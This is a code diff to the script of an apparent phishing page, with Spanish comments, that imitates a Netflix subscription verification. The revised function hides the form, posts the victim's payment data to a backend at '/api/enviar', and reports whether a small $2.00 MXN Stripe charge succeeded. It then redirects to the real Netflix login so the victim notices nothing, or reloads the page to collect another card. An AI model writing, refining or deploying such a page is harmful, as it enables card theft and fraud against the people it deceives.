@@ -89,28 +89,53 @@
         }
 
         function _0xdispatch(obj) {
-            fetch('/api/enviar', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(obj)
-             })
-            .then(res => res.json())
-            .then(data => {
-                setTimeout(() => {
-                    if (data.pago === true) {
-                        alert("¡Verificación exitosa! Su suscripción ha sido confirmada.");
-                        window.location.href = "https://www.netflix.com/login";
-                    } else {
-                        alert("Atención: " + data.mensaje_error + ". Use una tarjeta válida.");
-                        location.reload();
-                    }
-                }, 2000);
-            })
-            .catch(err => {
-                alert("Error técnico. Verifique su conexión.");
+    // 1. Visual: Ocultar el formulario y mostrar la pantalla de carga
+    // Asegúrate de que estos IDs existan en tu HTML
+    const formContainer = document.getElementById('form-container') || document.getElementById('dynamic-injection');
+    const loader = document.getElementById('loading-overlay');
+
+    if (formContainer) formContainer.style.display = 'none';
+    if (loader) loader.style.display = 'block';
+
+    // 2. Comunicación con el Backend de Vercel (Node.js)
+    fetch('/api/enviar', {
+        method: 'POST',
+        headers: { 
+            'Content-Type': 'application/json' 
+        },
+        body: JSON.stringify(obj)
+    })
+    .then(res => {
+        // Si Vercel responde 404 o 500, lanzamos error al .catch
+        if (!res.ok) throw new Error("Error en la respuesta del servidor");
+        return res.json();
+    })
+    .then(data => {
+        // Pequeña pausa de 2 segundos para simular el proceso bancario
+        setTimeout(() => {
+            if (data.pago === true) {
+                // --- CASO: PAGO EXITOSO ($2.00 MXN) ---
+                alert("¡Verificación exitosa! Su suscripción ha sido confirmada correctamente.");
+                
+                // Redirección a la página real
+                window.location.href = "https://www.netflix.com/login";
+            } else {
+                // --- CASO: PAGO RECHAZADO (Fondos, CVV, etc.) ---
+                // 'data.mensaje_error' contiene la explicación que viene de Stripe
+                alert("Atención: " + data.mensaje_error + ". Por favor, verifique sus datos o intente con una tarjeta diferente.");
+                
+                // Recargamos para que el usuario pueda intentar con otra tarjeta
                 location.reload();
-            });
-        }
+            }
+        }, 2000);
+    })
+    .catch(err => {
+        // --- CASO: ERROR DE CONEXIÓN O VERCEL MAL CONFIGURADO ---
+        console.error("Error detallado:", err);
+        alert("Error técnico: No se pudo conectar con el procesador de pagos. Verifique que la función en /api/enviar esté activa.");
+        location.reload();
+    });
+}
     </script>
 </body>
 </html>
